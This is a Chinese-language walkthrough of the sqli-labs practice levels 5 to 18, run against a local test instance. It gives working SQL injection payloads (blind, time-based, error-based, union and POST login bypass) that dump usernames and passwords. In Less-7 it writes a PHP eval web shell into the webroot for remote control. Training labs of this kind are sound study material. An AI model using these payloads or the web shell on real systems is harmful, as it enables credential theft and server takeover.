<p><img src="https://img-blog.csdnimg.cn/61a0920eadd44d1099bf5cadeb779a03.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 通过二分法拆解得到所有的库 </span><br><span class="line">http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; and ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1)) &gt; 10 --+</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 再次通过二分法可以猜解到security库下所有的表</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema =0x7365637572697479 limit 1,1),1,1)) =114 --+</span><br><span class="line"></span><br><span class="line">// 以此方法可以猜解user内的字段，以及字段的值</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/beb9c27c4108454f9c779ab3ebfa5c0f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h2 id="3，xpath注入"><a href="#3，xpath注入" class="headerlink" title="3，xpath注入"></a>3，xpath注入</h2><p>因为这里并不是完全的无回显，所以我们试试updatexml报错注入</p>
<p><img src="https://img-blog.csdnimg.cn/20200814170443301.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; and updatexml(1,concat(0x5e,database(),0x5e),1)--+</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/455677276dfc429eb73df9208e29bd5d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆表</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; and updatexml(1,concat(0x5e,(select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479),0x5e),1)--+</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/1d9c3a8c4ba04347a110d4bfd895d454.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/08380aa49b0947118b8e16e5502446c0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>报错： XPATH syntax error: ‘^Dumb<del>Dumb,Angelina</del>I-kill-you,D’ ,此时出现了一个小问题，我闷尝试这把所有内容爆出来，但是这里显示不全？原因就是我们的concat(0x5e,1,0x5e),如果完整的话，那么出现的内容两边必有^(0x5e).所有这个右边还有内容没报错出来。</p>
<p>我们可以用substr函数，截取，最后在拼接。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; and updatexml(1,concat(0x5e,substr((select group_concat(concat_ws(0x7e,username,password)) from users),1),0x5e),1) --+</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>可将substr函数里的1处依次加31.（因为每次只能查出31为字符）</p>
<p><img src="https://img-blog.csdnimg.cn/b56efaaf51814567b90aad853b523cdd.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> <img src="https://img-blog.csdnimg.cn/1057a1c58f534aeb873b416dab0f0f3b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 加上单引号发现不能注入，加上双引号发现报错，可以注入</span><br><span class="line">// 其余步骤与less-5一致</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-6/?id=1&quot;--+</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/d144da635b7141ae86d71f586f4fa595.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 发现 1&#x27;)) 可以闭合</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-7/?id=1&#x27;))  --+</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/6299b7ea238243dca23458d01c4bc28d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 存在三列</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-7/?id=1&#x27;)) order by 3 --+</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/e80cfd3c2e334330b38a004ab377040d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">我们将my.ini进行修改后，可以进行写入文件</span><br><span class="line">这里我们修改secure时候记得重启电脑，因为phpstudy自己的bug，这里我们写入一句话连接即可</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli-labs/Less-7/?id=1&#x27;)) union select 1,2,&#x27;&lt;?php @eval($_POST[&quot;crow&quot;]);?&gt;&#x27; into outfile &quot;E:\\1NetworkSecurity\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\a.php&quot;--+</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/d5525c23f145477a948cef6a7e2ec327.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>最后使用中国菜刀连接就行</p>
<h1 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h1><p>我们发现布尔盲注不可以，可以尝试时间盲注</p>
<p> 基于时间盲注，可行</p>
<p><a href="http://127.0.0.1/sqli-labs/Less-8/?id=1&#39;">http://127.0.0.1/sqli-labs/Less-8/?id=1&#39;</a> and if(length(database())=8,1,sleep(5))–+</p>
<p><img src="https://img-blog.csdnimg.cn/620208492f8840be82d7a64055bb15ed.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>ascii 拆解</p>
<p><img src="https://img-blog.csdnimg.cn/e11a49bc4812495786c4c7b6f4b164f1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>其余步骤 与less-5一致</p>
<h1 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h1><p>基于时间的盲注依然可行 步骤同less-5 ascii拆解一致</p>
<p><img src="https://img-blog.csdnimg.cn/60201f4c65794e0ba95b138595d9529b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h1><p>双引号 基于时间盲注测试 ,其余步骤同less-9</p>
<p><img src="https://img-blog.csdnimg.cn/ce28c7e70e9148c192822658f2dcab19.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h1><p>使用万能密码登录 admin</p>
<p><img src="https://img-blog.csdnimg.cn/a53c10424fd94842bb4a3cc08c4300bd.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 通过burpsuite抓包获取提交数据的格式</p>
<p><img src="https://img-blog.csdnimg.cn/5e332123bf2c491fa19621c90096d082.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 修改语句提交，报错存在注入漏洞<img src="https://img-blog.csdnimg.cn/dd0bf6e127f844dcb72e33757e6c2c7d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 修改语句未报错 存在两列</p>
<p><img src="https://img-blog.csdnimg.cn/ecdc9321e6fd410290a2f40a3662cd79.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 使用联合查询，查看结果存在回显</p>
<p><img src="https://img-blog.csdnimg.cn/1b93a6dbb1094679b96ed1d6c85d9e70.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>修改语句，爆表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=&#x27; union select 1, group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479# &amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/62bf5d380d1c4f87b939ba2b5da6c8e2.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>报错注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=-admin&#x27; and updatexml(1,concat(0x5e,(select group_concat(username,0x7e,password) from users),0x5e),1) #&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/32669f7876c64183bdfbdb92e4a38c2d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h1><p><img src="https://img-blog.csdnimg.cn/eca557b7189c41d7a16d2d09b3bd1ef1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>测试发现 加上 “) 之后闭合，显示登录成功 </p>
<p><img src="https://img-blog.csdnimg.cn/a982c4c17b394a3b9fbd431a54374ce2.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>之后步骤同less-11</p>
<h1 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h1><p>发现 添加 ‘) 之后闭合  ，存在注入漏洞</p>
<p><img src="https://img-blog.csdnimg.cn/28c4ae7a53834dde895365c77edb3b65.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 登录成功后并没有回显，尝试报错注入</p>
<p><img src="https://img-blog.csdnimg.cn/742852368f0445e0bcd6d0e46e1e1ec2.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=admin&#x27;) and updatexml(1,concat(0x5e,(select group_concat(username,0x7e,password) from users),0x5e),1) #&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/c74dd08cdd6b41fdad7c78c08119b418.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// extractvalue</span><br><span class="line"></span><br><span class="line">uname=admin&#x27;) and extractvalue(1,concat(0x7e,(select database())))#&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/53737a2eb2de4c4c85fa66b884640546.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/4355de7e0ce5409d970a33d533b18fca.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h1><p>测试发现 加上 ” 后闭合，没有回显，采用时间盲注或者报错注入</p>
<p><img src="https://img-blog.csdnimg.cn/9f81f90f4f2e4761905d98ee1cf52531.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 报错注入：</p>
<p><img src="https://img-blog.csdnimg.cn/c6a8e79a1bdd46268598b47142bd1908.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h1><p>测试 单引号 闭合 显示登录成功</p>
<p><img src="https://img-blog.csdnimg.cn/9cacd719be84492b84e17b0e571e7f15.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=admin&#x27; and sleep(10) #&amp;passwd=admin&amp;submit=Submit</span><br><span class="line"></span><br><span class="line">时间盲注</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/daf3ea98a7d14a75a854d6438f7b4cfc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">基于bool型/时间延迟单引号POST型盲注</span><br><span class="line">uname=a&#x27; or length(database())=&#x27;8&#x27; #&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> <img src="https://img-blog.csdnimg.cn/7310716fb4664efc8302a5fcd84aaa7f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h1><p>与15关相同关闭了报错提示，但可以根据页面的回显来判断。</p>
<p>当测试到admin”) #时页面显示登陆成功，所以闭合方式为双引号括号”)，如果不知道用户名可以这样测试， <code>123&quot;) or 1 #</code></p>
<p> <img src="https://img-blog.csdnimg.cn/4f3a72af3c4745f09b8338440809ea70.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h1><p>我们可以看到用户名被check_input包裹了，而passwd没有 </p>
<h1 id="-2"><a href="#-2" class="headerlink" title></a><img src="https://img-blog.csdnimg.cn/2a5aa48001794ebcb34502532916667b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></h1><p> 这是它的检查函数，传入的值只会检查前15位</p>
<p>get_magic_quotes_gpc — 获取当前 magic_quotes_gpc 的配置选项设置<br> 如果 magic_quotes_gpc 为关闭时返回 0，否则返回 1。在 PHP 5.4.O 起将始终返回 FALSE。magic_quotes_gpc开启时用于在预定义字符（单引号、双引号、斜杠、NULL）前加上反斜杠，</p>
<p>5.4.0 始终返回 FALSE，因为这个魔术引号功能已经从 PHP 中移除了。</p>
<p><img src="https://img-blog.csdnimg.cn/57c63040f7984cddaeefe02c31433476.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 所以我们在password之后进行操作</p>
<p>在password之后 加入 ‘) 之后闭合，回显成功</p>
<p>存在注入漏洞</p>
<p><img src="https://img-blog.csdnimg.cn/779e29f5e42240fe807ebcffcddbe038.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=admin&amp;passwd=admin&#x27; and updatexml(1,concat(0x5e,database(),0x5e),1) #&amp;submit=Submit</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/8922fa115ee146f3b4f9671cbd6c0a62.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h1><p>通过测试我们发现无法在post的数据中注入</p>
<p>我们发现登录成功后会回显我们的ip和User-Agent信息</p>
<p>可以尝试通过请求头进行注入</p>
<p>需要我们使用到火狐的扩展插件，用来修改请求头信息</p>
<p><img src="https://img-blog.csdnimg.cn/3dcca10bbb884457a385104e2459918e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
